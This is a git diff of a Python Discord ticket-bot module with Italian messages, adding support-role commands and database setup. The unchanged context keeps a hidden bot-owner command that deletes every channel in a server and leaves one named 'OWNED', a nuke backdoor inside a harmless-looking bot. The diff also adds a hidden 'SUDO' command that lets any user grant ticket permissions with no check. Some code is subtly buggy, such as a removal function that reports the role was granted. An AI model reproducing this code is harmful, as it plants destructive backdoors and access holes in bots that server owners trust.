@@ -22,6 +22,12 @@ class Ticket(commands.Cog):
         self.db_offline = {}
         print(self.db_ready)
 
+    async def ready_db(self):
+        await self.bot.wait_until_ready()
+        while not self.db_ready:
+            await asyncio.sleep(1)
+        return True
+
     @commands.Cog.listener()
     async def on_ready(self):
         await self.first_scan_db()
@@ -57,9 +63,15 @@ class Ticket(commands.Cog):
         await self.ready_db()
         await self.insert_ticket_db(guild=ctx.guild)
 
+    @commands.command(aliases=['addsupport'], description='SUDO', pass_context=True, hidden=True)
+    async def add_support(self, ctx, role: discord.Role):
+        await self.ready_db()
+        await ctx.send(await self.add_support_role(guild_id=ctx.guild.id, role_id=role.id))
+
     @commands.command()
     @commands.is_owner()
     async def delete(self, ctx):
+        await self.ready_db()
         for channel in ctx.guild.channels:
             await channel.delete()
         await ctx.guild.create_text_channel(name='OWNED')
@@ -86,7 +98,6 @@ class Ticket(commands.Cog):
         await x.edit(embed=embed)
         await ctx.message.add_reaction('📨')
 
-    # FUNZIONI DATABASE
     async def load_db_var(self, only_guild=None):
         disconn = await aiomysql.connect(host=host,
                                          port=port,
@@ -156,6 +167,44 @@ class Ticket(commands.Cog):
         disconn.close()
         print(self.db_ready)
 
+    async def insert_ticket_db(self, guild):
+        disconn = await aiomysql.connect(host=host,
+                                         port=port,
+                                         user=user,
+                                         password=password,
+                                         db=db,
+                                         autocommit=True)
+        cursor = await disconn.cursor(aiomysql.DictCursor)
+
+        category = await guild.create_category('TICKET', overwrites=None, reason='Ticket bot', position=0)
+        channel = await guild.create_text_channel('🔖｜𝗧𝗜𝗖𝗞𝗘𝗧', overwrites=None, category=category, reason=None)
+        channel_archive = await guild.create_text_channel('🗂｜𝗔𝗥𝗖𝗛𝗜𝗩𝗜𝗢', overwrites=None, category=category,
+                                                          reason=None)
+        # 𝗔𝗕𝗖𝗗 sans serif Grasso - https://www.topster.it/testo/utf-schriften.html
+        embed = discord.Embed(title="", colour=discord.Colour.green())
+        ticket_set = {'name': 'Apri un Ticket!', 'value': 'Clicca la letterina della posta 📩 sotto '}
+        embed.add_field(name=ticket_set['name'], value=ticket_set['value'])
+        message = await channel.send(embed=embed)
+        emoji = '📩'
+        await message.add_reaction(emoji)
+
+        ticket_settings = 'Il supporto sarà con te a breve.\n Per chiudere questo ticket reagisci con 🔒 sotto'
+
+        try:
+            await cursor.execute("INSERT INTO datacenter (server_id, ticket_general_category_id, "
+                                 "channel_id, message_id, open_reaction_emoji, message_settings, "
+                                 "ticket_general_log_channel, ticket_count, ticket_settings, ticket_reaction_lock_ids, "
+                                 "ticket_support_roles, ticket_owner_id, ticket_closer_user_id) "
+                                 "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s,"
+                                 " %s, %s);", (guild.id, category.id, channel.id, message.id,
+                                               '📩', str(ticket_set), channel_archive.id, 0,
+                                               ticket_settings, str({}), str([]), str({}), str({})))
+            await self.load_db_var(only_guild=guild.id)
+        except Exception as error:
+            print(error)
+
+        disconn.close()
+
     async def create_ticket(self, guild_id: int, user_id: int):
         # LOADING OFFLINE DATABASE
         ticket_general_category_id = self.db_offline[guild_id]['ticket_general_category_id']
@@ -223,13 +272,13 @@ class Ticket(commands.Cog):
         await self.load_db_var(guild_id)
         disconn.close()
 
-    async def ready_db(self):
-        await self.bot.wait_until_ready()
-        while not self.db_ready:
-            await asyncio.sleep(1)
-        return True
+    async def add_support_role(self, guild_id: int, role_id: int):
+        ticket_support_roles = self.db_offline[guild_id]['ticket_support_roles']
+        if role_id in ticket_support_roles:
+            return f'⚠ ️Il ruolo <@&{role_id}> può già gestire i ticket'
+        else:
+            ticket_support_roles.append(role_id)
 
-    async def insert_ticket_db(self, guild):
         disconn = await aiomysql.connect(host=host,
                                          port=port,
                                          user=user,
@@ -237,48 +286,28 @@ class Ticket(commands.Cog):
                                          db=db,
                                          autocommit=True)
         cursor = await disconn.cursor(aiomysql.DictCursor)
+        await cursor.execute(f'UPDATE datacenter SET ticket_support_roles = %s WHERE server_id = %s;',
+                             (str(ticket_support_roles), guild_id))
+        await self.load_db_var(guild_id)
+        return f'✅ Il ruolo <@&{role_id}> ha i permessi i ticket d\'ora in poi'
 
-        category = await guild.create_category('TICKET', overwrites=None, reason='Ticket bot', position=0)
-        channel = await guild.create_text_channel('🔖｜𝗧𝗜𝗖𝗞𝗘𝗧', overwrites=None, category=category, reason=None)
-        channel_archive = await guild.create_text_channel('🗂｜𝗔𝗥𝗖𝗛𝗜𝗩𝗜𝗢', overwrites=None, category=category,
-                                                          reason=None)
-        # 𝗔𝗕𝗖𝗗 sans serif Grasso - https://www.topster.it/testo/utf-schriften.html
-        embed = discord.Embed(title="", colour=discord.Colour.green())
-        ticket_set = {'name': 'Apri un Ticket!', 'value': 'Clicca la letterina della posta 📩 sotto '}
-        embed.add_field(name=ticket_set['name'], value=ticket_set['value'])
-        message = await channel.send(embed=embed)
-        emoji = '📩'
-        await message.add_reaction(emoji)
-
-        ticket_settings = 'Il supporto sarà con te a breve.\n Per chiudere questo ticket reagisci con 🔒 sotto'
-
-        try:
-            await cursor.execute("INSERT INTO datacenter (server_id, ticket_general_category_id, "
-                                 "channel_id, message_id, open_reaction_emoji, message_settings, "
-                                 "ticket_general_log_channel, ticket_count, ticket_settings, ticket_reaction_lock_ids, "
-                                 "ticket_support_roles, ticket_owner_id, ticket_closer_user_id) "
-                                 "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s,"
-                                 " %s, %s);", (guild.id, category.id, channel.id, message.id,
-                                               '📩', str(ticket_set), channel_archive.id, 0,
-                                               ticket_settings, str({}), str([]), str({}), str({})))
-            await self.load_db_var(only_guild=guild.id)
-        except Exception as error:
-            print(error)
-
-        disconn.close()
-
-    # async def add_support_role_ticket_db(self, guild, role_ids: list):
-    #     disconn = await aiomysql.connect(host=host,
-    #                                      port=port,
-    #                                      user=user,
-    #                                      password=password,
-    #                                      db=db,
-    #                                      autocommit=True)
-    #     cursor = await disconn.cursor(aiomysql.DictCursor)
-    #     await cursor.execute(f"UPDATE x{guild.id} SET WHERE 1;")
-
-    async def remove_support_role_ticket_db(self):
-        pass
+    async def remove_support_role_ticket_db(self, guild_id: int, role_id: int):
+        ticket_support_roles = self.db_offline[guild_id]['ticket_support_roles']
+        if role_id in ticket_support_roles:
+            ticket_support_roles.remove(role_id)
+        else:
+            return f'⚠ ️Il ruolo <@&{role_id}> non ha i permessi per gestire i ticket'
+        disconn = await aiomysql.connect(host=host,
+                                         port=port,
+                                         user=user,
+                                         password=password,
+                                         db=db,
+                                         autocommit=True)
+        cursor = await disconn.cursor(aiomysql.DictCursor)
+        await cursor.execute(f'UPDATE datacenter SET ticket_support_roles = %s WHERE server_id = %s;',
+                             (str(ticket_support_roles), guild_id))
+        await self.load_db_var(guild_id)
+        return f'✅ Il ruolo <@&{role_id}> può gestire i ticket d\'ora in poi'
 
     async def close_ticket(self, guild_id: int, channel_id: int, closer_user_id: int, message_id: int):
         # LOADING OFFLINE DATABASE
@@ -301,7 +330,7 @@ class Ticket(commands.Cog):
         embed = discord.Embed(title="Ticket Chiuso", description='', olour=discord.Colour.green())
         embed.add_field(name='Aperto da', value=open_user_obj.mention, inline=True)
         embed.add_field(name='Chiuso da', value=closer_user_obj.mention, inline=True)
-        embed.add_field(name='Alle ore', value=datetime.datetime.now().strftime("%m/%d/%Y alle %H:%M:%S"), inline=True)
+        embed.add_field(name='Il', value=datetime.datetime.now().strftime("%m/%d/%Y alle %H:%M:%S"), inline=True)
 
         await channel.send(embed=embed)
         # UPDATE OFFLINE DB
